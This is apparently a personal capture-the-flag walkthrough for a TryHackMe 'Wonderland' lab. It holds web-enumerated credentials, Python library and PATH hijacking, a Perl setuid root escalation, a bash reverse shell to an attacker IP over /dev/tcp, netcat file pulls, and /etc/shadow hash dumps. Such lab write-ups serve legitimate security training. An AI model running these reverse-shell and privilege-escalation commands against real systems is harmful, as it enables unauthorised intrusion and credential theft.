@@ -1,0 +1,258 @@
+https://www.youtube.com/watch?v=v8pJDTpaLXY
+https://gtfobins.github.io/gtfobins/perl/
+
+
+				Enum
+(found dirs)
+/img
+/r
+/poem
+
+http://10.10.139.39/img/
+(found files)
+alice_door.jpg
+alice_door.png
+white_rabbit_1.jpg
+
+http://10.10.139.39/r/a/b/b/i/t/
+(found possible creds)
+
+alice:HowDothTheLittleCrocodileImproveHisShiningTail
+
+
+
+				SSH
+$ls 
+root.txt walrus_and_the_carpenter.py
+
+
+				Privesc
+
+sudo -l 
+[sudo] password for alice: 
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+
+
+(make a random.py)
+
+import os 
+os.system("/bin/bash -p")
+
+(save and exit)
+
+
+$sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
+
+$cd /home/rabbit
+$ls -l 
+-rwsr-sr-x 1 root   root   16816 May 25 17:58 teaParty
+$file teaParty
+teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
+
+
+
+
+
+
+
+
+				Reverse File get - (get a file from target machine)
+
+
+(on atacker)
+$cd /download/location/
+(on target)
+$nc -w 0 -lvnp 18456 < teaParty
+(on attacker)
+$nc 10.10.232.105 18456 > teaParty
+(on target should see)
+Listening on [0.0.0.0] (family 0, port 18456)
+Connection from 10.2.26.235 60980 received!
+
+
+
+
+
+
+
+
+
+				Privesc - Continued
+
+
+(make a fake date binary)
+$mkdir attack
+$cd attack
+$nano date
+#!/bin/bash
+
+/bin/bash -p 
+(save and exit)
+
+$cd ..
+$export PATH=/home/rabbit/atttack:$PATH
+$./teaParty
+$whoami
+hatter
+
+
+(didnt work)
+
+(netcat)
+(on attacker)
+nc -lvnp 15006
+(on target)
+(modify date file change line to)
+/bin/bash -c '/bin/bash -i >& /dev/tcp/10.2.26.235/15006 2.&1 0>&1'
+
+(save - cd .. - ./teaParty)
+$cd /home/hatter
+$cat password.txt
+WhyIsARavenLikeAWritingDesk?
+
+
+
+$ssh hatter@10.10.232.105
+$perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+$whoami
+root
+
+(dont look that good so exit and rerun with)
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -p";'
+(much better!)
+
+
+$cd root
+$ls
+user.txt
+$cat user.txt
+
+
+$cd /home/alice
+$cat root.txt
+thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
+
+
+
+
+
+
+				(Possible) Steg 
+
+$binwalk alice_door.jpg 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.02
+30            0x1E            TIFF image data, big-endian, offset of first image directory: 8
+332           0x14C           JPEG image data, JFIF standard 1.02
+12721         0x31B1          XML document, version: "1.0"
+21743         0x54EF          JPEG image data, JFIF standard 1.02
+
+
+$binwalk alice_door.png 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 1962 x 1942, 8-bit/color RGBA, non-interlaced
+91            0x5B            Zlib compressed data, compressed
+
+
+$binwalk -e white_rabbit_1.jpg 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+
+
+
+
+
+
+
+
+
+
+
+					$h!+s and gigs
+
+$cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
+alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
+hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
+rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
+
+
+
+
+
+
+$cat /etc/shadow
+root:*:18295:0:99999:7:::
+daemon:*:18295:0:99999:7:::
+bin:*:18295:0:99999:7:::
+sys:*:18295:0:99999:7:::
+sync:*:18295:0:99999:7:::
+games:*:18295:0:99999:7:::
+man:*:18295:0:99999:7:::
+lp:*:18295:0:99999:7:::
+mail:*:18295:0:99999:7:::
+news:*:18295:0:99999:7:::
+uucp:*:18295:0:99999:7:::
+proxy:*:18295:0:99999:7:::
+www-data:*:18295:0:99999:7:::
+backup:*:18295:0:99999:7:::
+list:*:18295:0:99999:7:::
+irc:*:18295:0:99999:7:::
+gnats:*:18295:0:99999:7:::
+nobody:*:18295:0:99999:7:::
+systemd-network:*:18295:0:99999:7:::
+systemd-resolve:*:18295:0:99999:7:::
+syslog:*:18295:0:99999:7:::
+messagebus:*:18295:0:99999:7:::
+_apt:*:18295:0:99999:7:::
+lxd:*:18295:0:99999:7:::
+uuidd:*:18295:0:99999:7:::
+dnsmasq:*:18295:0:99999:7:::
+landscape:*:18295:0:99999:7:::
+pollinate:*:18295:0:99999:7:::
+sshd:*:18407:0:99999:7:::
+tryhackme:$6$03LEWfOPLKjjbNH1$KXXH7/fb/OsMh3aGlL9qq5ePqY3lJ3Ve5Rvv1fW0utpNGYKUW9DbTcZCbKgX97gsyUAulvskti5WiuP6LssPH/:18407:0:99999:7:::
+alice:$6$pM/8jFY4$SWspRQzcwQiFeT1QSITKPvbjT9RAf9Wv84Q4jWyvoJ7g9dsrlgPBqUnc0ijg9ErqRHF8AtX6saPwhRucF/r82/:18407:0:99999:7:::
+hatter:$6$PRiFTSBg$x70rqlSA.yEtZhFNoRa2UwPkP1U6nbVjdEvWkNd/bLTJ5XvuEJfeEaAACp5BFTc0SGmV43qEi1z4vqSQao1Nc0:18407:0:99999:7:::
+rabbit:$6$HDf2Aoxu$A7v0eJsJWaTWf3.HnNBpv7TEzbjFh2aaF6JWRamRRS2wHIDbRiC7Sc9DhgENyb6IS3ME6febOJUyLaUYEFXcW.:18407:0:99999:7:::
